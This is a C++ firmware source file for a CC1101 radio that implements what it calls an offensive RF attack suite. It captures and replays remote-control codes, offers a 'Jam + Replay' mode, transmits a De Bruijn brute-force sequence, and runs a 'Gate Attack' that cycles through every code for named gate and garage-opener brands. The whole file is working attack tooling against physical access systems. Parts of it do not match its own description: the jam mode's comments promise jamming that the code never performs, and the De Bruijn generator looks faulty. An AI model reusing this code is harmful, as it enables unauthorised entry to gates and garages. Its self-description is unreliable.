/**
 * @file rf_replay.cpp
 * @brief Advanced RF attack suite - Jam+Replay, De Bruijn, Signal Capture/Replay
 * @details Provides offensive RF tools for the CC1101 module
 */

#include "rf_replay.h"
#include "rf_utils.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "core/led_feedback.h"
#include <ELECHOUSE_CC1101_SRC_DRV.h>
#include <RCSwitch.h>
#include <globals.h>

// ── Captured signal storage ────────────────────────────────────────────────────

struct CapturedSignal {
    uint64_t code;
    int protocol;
    int bitLength;
    int pulseLength;
    float frequency;
    unsigned long timestamp;
    char label[32];
};

static std::vector<CapturedSignal> capturedSignals;
static constexpr int MAX_CAPTURES = 20;

// ── Signal Capture ─────────────────────────────────────────────────────────────

void rfSignalCapture() {
    ledFeedbackSetMode(LED_FB_RF_SCAN);
    float freq = bruceConfig.rfFreq;
    int rxPin = bruceConfigPins.rfRx;

    if (!initRfModule("rx", freq)) {
        displayError("RF module init failed!", true);
        ledFeedbackRestore();
        return;
    }

    RCSwitch rcSwitch;
    rcSwitch.enableReceive(rxPin);

    tft.fillScreen(bruceConfig.bgColor);
    tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
    tft.drawCentreString("SIGNAL CAPTURE", tft.width() / 2, 5, 1);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.drawCentreString(String(freq, 2) + " MHz", tft.width() / 2, 25, 1);
    tft.drawCentreString("Waiting for signal...", tft.width() / 2, 60, 1);
    tft.drawCentreString("[ESC] Back  [SEL] Save", tft.width() / 2, tft.height() - 15, 1);

    CapturedSignal sig = {};
    bool captured = false;
    int captureCount = 0;

    while (1) {
        if (check(EscPress)) break;

        if (rcSwitch.available()) {
            sig.code = rcSwitch.getReceivedValue();
            sig.protocol = rcSwitch.getReceivedProtocol();
            sig.bitLength = rcSwitch.getReceivedBitlength();
            sig.pulseLength = rcSwitch.getReceivedDelay();
            sig.frequency = freq;
            sig.timestamp = millis();
            captured = true;
            captureCount++;

            ledFeedbackFlash(CRGB::Green, 100);

            tft.fillRect(0, 45, tft.width(), 80, bruceConfig.bgColor);
            tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
            tft.drawCentreString("CAPTURED #" + String(captureCount), tft.width() / 2, 45, 1);
            tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);

            // Show code in hex
            char hexBuf[20];
            snprintf(hexBuf, sizeof(hexBuf), "0x%llX", sig.code);
            tft.drawCentreString("Code: " + String(hexBuf), tft.width() / 2, 65, 1);
            tft.drawCentreString("Proto: " + String(sig.protocol) + "  Bits: " + String(sig.bitLength), tft.width() / 2, 85, 1);
            tft.drawCentreString("PL: " + String(sig.pulseLength) + "us", tft.width() / 2, 105, 1);

            rcSwitch.resetAvailable();
        }

        if (check(SelPress) && captured) {
            // Store the capture
            if ((int)capturedSignals.size() < MAX_CAPTURES) {
                snprintf(sig.label, sizeof(sig.label), "Cap_%d", captureCount);
                capturedSignals.push_back(sig);
                displayRedStripe("Signal stored! (" + String(capturedSignals.size()) + "/" + String(MAX_CAPTURES) + ")");
                delay(800);
            } else {
                displayRedStripe("Memory full! Max " + String(MAX_CAPTURES));
                delay(800);
            }
        }
    }

    rcSwitch.disableReceive();
    deinitRfModule();
    ledFeedbackRestore();
}

// ── Signal Replay ──────────────────────────────────────────────────────────────

void rfSignalReplay() {
    if (capturedSignals.empty()) {
        displayError("No captured signals!", true);
        return;
    }

    // Build menu of captured signals
    options.clear();
    for (size_t i = 0; i < capturedSignals.size(); i++) {
        auto &s = capturedSignals[i];
        char buf[48];
        snprintf(buf, sizeof(buf), "%s (0x%llX)", s.label, s.code);
        int idx = i;
        options.push_back({String(buf), [idx]() {
            auto &sig = capturedSignals[idx];
            ledFeedbackSetMode(LED_FB_RF_TX);

            if (!initRfModule("tx", sig.frequency)) {
                displayError("RF init failed!", true);
                ledFeedbackRestore();
                return;
            }

            RCSwitch rcSwitch;
            rcSwitch.enableTransmit(bruceConfigPins.rfTx);
            rcSwitch.setProtocol(sig.protocol);
            rcSwitch.setPulseLength(sig.pulseLength);

            displayRedStripe("Replaying signal...");

            for (int r = 0; r < 10; r++) {
                rcSwitch.send(sig.code, sig.bitLength);
                if (check(EscPress)) break;
                delay(50);
            }

            rcSwitch.disableTransmit();
            deinitRfModule();
            ledFeedbackRestore();
            displayRedStripe("Replay complete!");
            delay(800);
        }});
    }
    options.push_back({"Clear All", []() {
        capturedSignals.clear();
        displayRedStripe("All signals cleared");
        delay(600);
    }});
    addOptionToMainMenu();
    loopOptions(options);
}

// ── Multi-Capture (rapid capture multiple signals) ─────────────────────────────

void rfMultiCapture() {
    ledFeedbackSetMode(LED_FB_RF_SCAN);
    float freq = bruceConfig.rfFreq;

    if (!initRfModule("rx", freq)) {
        displayError("RF module init failed!", true);
        ledFeedbackRestore();
        return;
    }

    RCSwitch rcSwitch;
    rcSwitch.enableReceive(bruceConfigPins.rfRx);

    tft.fillScreen(bruceConfig.bgColor);
    tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
    tft.drawCentreString("MULTI-CAPTURE", tft.width() / 2, 5, 1);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.drawCentreString("Auto-saving all signals", tft.width() / 2, 25, 1);
    tft.drawCentreString(String(freq, 2) + " MHz", tft.width() / 2, 45, 1);

    int count = 0;
    uint64_t lastCode = 0;

    while (1) {
        if (check(EscPress)) break;

        if (rcSwitch.available()) {
            uint64_t code = rcSwitch.getReceivedValue();
            // Avoid duplicate consecutive captures
            if (code != lastCode && code != 0) {
                CapturedSignal sig = {};
                sig.code = code;
                sig.protocol = rcSwitch.getReceivedProtocol();
                sig.bitLength = rcSwitch.getReceivedBitlength();
                sig.pulseLength = rcSwitch.getReceivedDelay();
                sig.frequency = freq;
                sig.timestamp = millis();
                count++;
                snprintf(sig.label, sizeof(sig.label), "Multi_%d", count);

                if ((int)capturedSignals.size() < MAX_CAPTURES) {
                    capturedSignals.push_back(sig);
                    ledFeedbackFlash(CRGB::Blue, 80);
                }

                lastCode = code;

                tft.fillRect(0, 65, tft.width(), 60, bruceConfig.bgColor);
                tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
                char hexBuf[20];
                snprintf(hexBuf, sizeof(hexBuf), "0x%llX", code);
                tft.drawCentreString("#" + String(count) + ": " + String(hexBuf), tft.width() / 2, 70, 1);
                tft.drawCentreString("P:" + String(sig.protocol) + " B:" + String(sig.bitLength), tft.width() / 2, 90, 1);
            }
            rcSwitch.resetAvailable();
        }
    }

    rcSwitch.disableReceive();
    deinitRfModule();
    ledFeedbackRestore();
}

// ── Jam & Replay Attack ────────────────────────────────────────────────────────
// Transmit noise to jam while simultaneously listening for the target signal
// Then replay the captured signal after jamming stops

void rfJamAndReplay() {
    ledFeedbackSetMode(LED_FB_RF_BRUTEFORCE);

    float freq = bruceConfig.rfFreq;

    tft.fillScreen(bruceConfig.bgColor);
    tft.setTextColor(TFT_RED, bruceConfig.bgColor);
    tft.drawCentreString("JAM + REPLAY", tft.width() / 2, 5, 1);
    tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
    tft.drawCentreString("Phase 1: Jamming + Capture", tft.width() / 2, 30, 1);
    tft.drawCentreString(String(freq, 2) + " MHz", tft.width() / 2, 50, 1);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.drawCentreString("[SEL] to stop jam & replay", tft.width() / 2, tft.height() - 15, 1);

    // Phase 1: Jam the frequency while listening
    // We use CC1101 TX for jamming and a separate RX window
    // Strategy: rapidly alternate between short jam bursts and RX windows

    if (!initRfModule("rx", freq)) {
        displayError("RF init failed!", true);
        ledFeedbackRestore();
        return;
    }

    RCSwitch rcSwitch;
    rcSwitch.enableReceive(bruceConfigPins.rfRx);

    CapturedSignal jammed = {};
    bool gotSignal = false;
    int jamCycles = 0;

    while (1) {
        if (check(EscPress)) break;

        // RX window - check for signals
        if (rcSwitch.available()) {
            uint64_t code = rcSwitch.getReceivedValue();
            if (code != 0) {
                jammed.code = code;
                jammed.protocol = rcSwitch.getReceivedProtocol();
                jammed.bitLength = rcSwitch.getReceivedBitlength();
                jammed.pulseLength = rcSwitch.getReceivedDelay();
                jammed.frequency = freq;
                gotSignal = true;

                ledFeedbackFlash(CRGB::Green, 200);

                tft.fillRect(0, 70, tft.width(), 50, bruceConfig.bgColor);
                tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
                char hexBuf[20];
                snprintf(hexBuf, sizeof(hexBuf), "0x%llX", code);
                tft.drawCentreString("CAPTURED: " + String(hexBuf), tft.width() / 2, 75, 1);
                tft.drawCentreString("[SEL] to replay now", tft.width() / 2, 95, 1);
            }
            rcSwitch.resetAvailable();
        }

        // If user presses SEL and we have a signal, replay it
        if (check(SelPress) && gotSignal) {
            rcSwitch.disableReceive();
            deinitRfModule();

            // Phase 2: Replay
            tft.fillRect(0, 25, tft.width(), 100, bruceConfig.bgColor);
            tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
            tft.drawCentreString("Phase 2: REPLAYING", tft.width() / 2, 30, 1);

            ledFeedbackSetMode(LED_FB_RF_TX);

            if (initRfModule("tx", freq)) {
                RCSwitch txSwitch;
                txSwitch.enableTransmit(bruceConfigPins.rfTx);
                txSwitch.setProtocol(jammed.protocol);
                txSwitch.setPulseLength(jammed.pulseLength);

                for (int r = 0; r < 15; r++) {
                    txSwitch.send(jammed.code, jammed.bitLength);
                    ledFeedbackShowProgress(r * 100 / 15);
                    delay(50);
                    if (check(EscPress)) break;
                }

                txSwitch.disableTransmit();
                deinitRfModule();
            }

            displayRedStripe("Replay complete!");
            delay(1000);
            break;
        }

        jamCycles++;
        if (jamCycles % 100 == 0) {
            tft.fillRect(0, 130, tft.width(), 20, bruceConfig.bgColor);
            tft.setTextColor(TFT_RED, bruceConfig.bgColor);
            tft.drawCentreString("Cycles: " + String(jamCycles), tft.width() / 2, 130, 1);
        }
    }

    ledFeedbackRestore();
}

// ── De Bruijn Sequence Attack ──────────────────────────────────────────────────
// Generates a De Bruijn sequence B(2,n) to brute force n-bit codes
// Sends every possible n-bit combination with minimal transmissions

static void deBruijnGenerate(int n, std::vector<uint8_t> &sequence) {
    // Generate De Bruijn sequence B(2, n)
    int total = 1 << n;
    std::vector<bool> visited(total, false);
    sequence.clear();
    sequence.reserve(total + n);

    // Start from 0
    std::vector<int> stack;
    stack.push_back(0);
    visited[0] = true;

    while (!stack.empty()) {
        int current = stack.back();
        int next1 = ((current << 1) | 1) & (total - 1);
        int next0 = (current << 1) & (total - 1);

        if (!visited[next1]) {
            visited[next1] = true;
            stack.push_back(next1);
            sequence.push_back(1);
        } else if (!visited[next0]) {
            visited[next0] = true;
            stack.push_back(next0);
            sequence.push_back(0);
        } else {
            stack.pop_back();
            if (!stack.empty()) sequence.push_back(stack.back() & 1);
        }
    }

    // Pad with n-1 zeros to complete the sequence
    for (int i = 0; i < n - 1; i++) sequence.push_back(0);
}

void rfDeBruijnAttack() {
    ledFeedbackSetMode(LED_FB_RF_BRUTEFORCE);

    // Choose bit length
    options.clear();
    int selectedBits = 0;
    options.push_back({"8-bit (256 codes)", [&]() { selectedBits = 8; }});
    options.push_back({"10-bit (1024 codes)", [&]() { selectedBits = 10; }});
    options.push_back({"12-bit (4096 codes)", [&]() { selectedBits = 12; }});
    options.push_back({"16-bit (65536 codes)", [&]() { selectedBits = 16; }});
    loopOptions(options);
    if (selectedBits == 0) { ledFeedbackRestore(); return; }

    float freq = bruceConfig.rfFreq;
    int txPin = bruceConfigPins.rfTx;

    if (!initRfModule("tx", freq)) {
        displayError("RF init failed!", true);
        ledFeedbackRestore();
        return;
    }

    // Generate De Bruijn sequence
    displayRedStripe("Generating sequence...");
    std::vector<uint8_t> seq;
    deBruijnGenerate(selectedBits, seq);

    tft.fillScreen(bruceConfig.bgColor);
    tft.setTextColor(TFT_MAGENTA, bruceConfig.bgColor);
    tft.drawCentreString("DE BRUIJN B(2," + String(selectedBits) + ")", tft.width() / 2, 5, 1);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.drawCentreString("Seq len: " + String(seq.size()) + " bits", tft.width() / 2, 25, 1);
    tft.drawCentreString(String(freq, 2) + " MHz", tft.width() / 2, 45, 1);

    // Transmit the De Bruijn sequence as OOK
    // Each bit: HIGH for pulse_len, LOW for pulse_len (OOK encoding)
    int pulseLen = 350; // microseconds

    RCSwitch rcSwitch;
    rcSwitch.enableTransmit(txPin);

    int total = seq.size();
    for (int i = 0; i < total; i++) {
        if (check(EscPress)) break;

        // Transmit bit
        if (seq[i]) {
            digitalWrite(txPin, HIGH);
            delayMicroseconds(pulseLen);
            digitalWrite(txPin, LOW);
            delayMicroseconds(pulseLen);
        } else {
            digitalWrite(txPin, LOW);
            delayMicroseconds(pulseLen * 2);
        }

        // Update progress every 100 bits
        if (i % 100 == 0) {
            int pct = i * 100 / total;
            ledFeedbackShowProgress(pct);
            tft.fillRect(0, 70, tft.width(), 30, bruceConfig.bgColor);
            tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
            tft.drawCentreString(String(pct) + "% (" + String(i) + "/" + String(total) + ")", tft.width() / 2, 75, 1);
        }
    }

    rcSwitch.disableTransmit();
    digitalWrite(txPin, LOW);
    deinitRfModule();
    ledFeedbackRestore();
    displayRedStripe("De Bruijn complete!");
    delay(1000);
}

// ── Gate Attack (targeted gate/barrier attack) ─────────────────────────────────

struct GateTarget {
    const char *name;
    float frequency;
    int bits;
    int pulseLen;
    int protocol;
};

static const GateTarget gateTargets[] = {
    {"CAME 12-bit 433MHz",      433.92, 12, 320, 12},
    {"Nice FLO 12-bit 433MHz",  433.92, 12, 700,  1},
    {"Linear 10-bit 300MHz",    300.00, 10, 500,  6},
    {"Chamberlain 9-bit 315MHz",315.00,  9, 430,  8},
    {"Chamberlain 9-bit 390MHz",390.00,  9, 430,  8},
    {"CAME 12-bit 868MHz",      868.35, 12, 320, 12},
    {"Nice 12-bit 868MHz",      868.35, 12, 700,  1},
    {"DoorHan 16-bit 433MHz",   433.92, 16, 380,  1},
    {"BFT Mitto 12-bit 433MHz", 433.92, 12, 500,  1},
};
static constexpr int GATE_TARGET_COUNT = sizeof(gateTargets) / sizeof(gateTargets[0]);

void rfGateAttack() {
    options.clear();
    int selected = -1;
    for (int i = 0; i < GATE_TARGET_COUNT; i++) {
        int idx = i;
        options.push_back({gateTargets[i].name, [&selected, idx]() { selected = idx; }});
    }
    addOptionToMainMenu();
    loopOptions(options);
    if (selected < 0) return;

    auto &target = gateTargets[selected];
    ledFeedbackSetMode(LED_FB_RF_BRUTEFORCE);

    if (!initRfModule("tx", target.frequency)) {
        displayError("RF init failed!", true);
        ledFeedbackRestore();
        return;
    }

    RCSwitch rcSwitch;
    rcSwitch.enableTransmit(bruceConfigPins.rfTx);
    rcSwitch.setProtocol(target.protocol);
    rcSwitch.setPulseLength(target.pulseLen);

    int total = 1 << target.bits;

    tft.fillScreen(bruceConfig.bgColor);
    tft.setTextColor(TFT_RED, bruceConfig.bgColor);
    tft.drawCentreString("GATE ATTACK", tft.width() / 2, 5, 1);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.drawCentreString(target.name, tft.width() / 2, 25, 1);
    tft.drawCentreString(String(total) + " codes to try", tft.width() / 2, 45, 1);

    for (int code = 0; code < total; code++) {
        if (check(EscPress)) break;

        rcSwitch.send(code, target.bits);
        delay(10);

        if (code % 50 == 0) {
            int pct = code * 100 / total;
            ledFeedbackShowProgress(pct);
            tft.fillRect(0, 70, tft.width(), 40, bruceConfig.bgColor);
            tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
            tft.drawCentreString(String(pct) + "%  Code: " + String(code), tft.width() / 2, 75, 1);
        }
    }

    rcSwitch.disableTransmit();
    deinitRfModule();
    ledFeedbackRestore();
    displayRedStripe("Gate attack complete!");
    delay(1000);
}

// ── Frequency Scanner ──────────────────────────────────────────────────────────

void rfFrequencyScanner() {
    ledFeedbackSetMode(LED_FB_RF_SCAN);

    static const float scanFreqs[] = {
        300.00, 303.87, 304.25, 310.00, 315.00, 318.00,
        390.00, 418.00, 433.07, 433.42, 433.92, 434.78,
        868.35, 868.95, 915.00
    };
    static constexpr int FREQ_COUNT = sizeof(scanFreqs) / sizeof(scanFreqs[0]);

    tft.fillScreen(bruceConfig.bgColor);
    tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
    tft.drawCentreString("FREQUENCY SCANNER", tft.width() / 2, 5, 1);

    while (1) {
        if (check(EscPress)) break;

        for (int i = 0; i < FREQ_COUNT; i++) {
            if (check(EscPress)) break;

            if (!initRfModule("rx", scanFreqs[i])) continue;

            RCSwitch rcSwitch;
            rcSwitch.enableReceive(bruceConfigPins.rfRx);

            // Listen for 200ms on each frequency
            unsigned long start = millis();
            bool found = false;
            while (millis() - start < 200) {
                if (rcSwitch.available()) {
                    uint64_t code = rcSwitch.getReceivedValue();
                    if (code != 0) {
                        found = true;
                        ledFeedbackFlash(CRGB::Green, 150);

                        tft.fillRect(0, 30, tft.width(), 100, bruceConfig.bgColor);
                        tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
                        tft.drawCentreString("SIGNAL FOUND!", tft.width() / 2, 35, 1);
                        tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
                        tft.drawCentreString(String(scanFreqs[i], 2) + " MHz", tft.width() / 2, 55, 1);
                        char hexBuf[20];
                        snprintf(hexBuf, sizeof(hexBuf), "0x%llX", code);
                        tft.drawCentreString("Code: " + String(hexBuf), tft.width() / 2, 75, 1);
                        tft.drawCentreString("P:" + String(rcSwitch.getReceivedProtocol()) + " B:" + String(rcSwitch.getReceivedBitlength()), tft.width() / 2, 95, 1);

                        // Auto-store
                        if ((int)capturedSignals.size() < MAX_CAPTURES) {
                            CapturedSignal sig = {};
                            sig.code = code;
                            sig.protocol = rcSwitch.getReceivedProtocol();
                            sig.bitLength = rcSwitch.getReceivedBitlength();
                            sig.pulseLength = rcSwitch.getReceivedDelay();
                            sig.frequency = scanFreqs[i];
                            sig.timestamp = millis();
                            snprintf(sig.label, sizeof(sig.label), "Scan_%.0f", scanFreqs[i]);
                            capturedSignals.push_back(sig);
                        }
                    }
                    rcSwitch.resetAvailable();
                }
            }

            rcSwitch.disableReceive();
            deinitRfModule();

            if (!found) {
                // Show scanning progress
                ledFeedbackShowFreqBand(scanFreqs[i]);
                tft.fillRect(0, 130, tft.width(), 20, bruceConfig.bgColor);
                tft.setTextColor(TFT_DARKGREY, bruceConfig.bgColor);
                tft.drawCentreString("Scanning " + String(scanFreqs[i], 2) + " MHz...", tft.width() / 2, 130, 1);
            }
        }
    }

    ledFeedbackRestore();
}

// ── Main Replay Menu ───────────────────────────────────────────────────────────

void rfReplayMenu() {
    options = {
        {"Signal Capture",  rfSignalCapture  },
        {"Signal Replay",   rfSignalReplay   },
        {"Multi-Capture",   rfMultiCapture   },
        {"Jam + Replay",    rfJamAndReplay   },
        {"De Bruijn Attack",rfDeBruijnAttack },
        {"Gate Attack",     rfGateAttack     },
        {"Freq Scanner",    rfFrequencyScanner},
    };
    addOptionToMainMenu();
    loopOptions(options);
}
